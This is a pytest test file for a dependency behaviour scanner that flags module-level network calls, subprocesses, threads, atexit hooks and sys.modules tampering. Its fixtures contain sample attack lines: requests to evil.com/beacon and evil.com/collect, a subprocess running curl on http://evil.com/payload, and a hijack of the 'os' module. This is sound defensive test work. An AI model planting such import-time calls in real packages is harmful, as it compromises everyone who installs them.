"""
Tests for DepBehaviorScanner — AST-based behavioral profiling.
"""

from __future__ import annotations
import pytest
import tempfile
from pathlib import Path
from arcada.scanners.dep_behavior import DepBehaviorScanner
from arcada.models import Severity


@pytest.mark.asyncio
async def test_detects_module_level_network_call():
    """Module-level requests.get() should be flagged."""
    code = 'import requests\nrequests.get("https://evil.com/beacon")\n'
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert any("network" in f.title.lower() for f in findings)
    assert any(f.severity == Severity.HIGH for f in findings)


@pytest.mark.asyncio
async def test_ignores_function_level_network_call():
    """Network call inside a function should NOT be flagged."""
    code = (
        "import requests\n"
        "def fetch_data():\n"
        '    return requests.get("https://api.example.com")\n'
    )
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert not any("network" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_detects_module_level_subprocess():
    """Module-level subprocess.call() should be flagged as CRITICAL."""
    code = 'import subprocess\nsubprocess.call(["curl", "http://evil.com/payload"])\n'
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert any("subprocess" in f.title.lower() for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_module_level_threading():
    """Module-level threading.Thread() should be flagged."""
    code = "import threading\nt = threading.Thread(target=evil_func)\nt.start()\n"
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert any("threading" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_detects_atexit_register():
    """atexit.register() at module level should be flagged."""
    code = "import atexit\natexit.register(cleanup_backdoor)\n"
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert any("persistence" in f.title.lower() for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_sys_modules_manipulation():
    """sys.modules assignment at module level should be flagged."""
    code = 'import sys\nsys.modules["os"] = my_evil_os\n'
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert any("sys.modules" in f.title or "sys/builtins" in f.title for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_ignores_class_level_code():
    """Code inside a class body should NOT be flagged as module-level."""
    code = (
        "import requests\n"
        "class Client:\n"
        '    response = requests.get("https://api.example.com")\n'
    )
    scanner = DepBehaviorScanner(
        content=code,
        path="test.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert not any("network" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_scan_directory():
    """Test scanning a directory of Python files."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg_dir = Path(tmpdir) / "evil_lib"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text(
            'import requests\nrequests.get("https://evil.com/collect")\n'
        )
        (pkg_dir / "safe.py").write_text("def helper():\n    return 42\n")

        scanner = DepBehaviorScanner(
            content="",
            path="",
            metadata={
                "pkg_path": str(pkg_dir),
                "package": "evil_lib",
                "version": "0.1.0",
            },
        )
        findings = await scanner.scan()
        assert any("network" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_handles_syntax_error():
    """Scanner should not crash on files with syntax errors."""
    code = "def broken(\n    this is not valid python\n"
    scanner = DepBehaviorScanner(
        content=code,
        path="broken.py",
        metadata={"package": "test_pkg", "version": "1.0.0"},
    )
    findings = await scanner.scan()
    assert isinstance(findings, list)
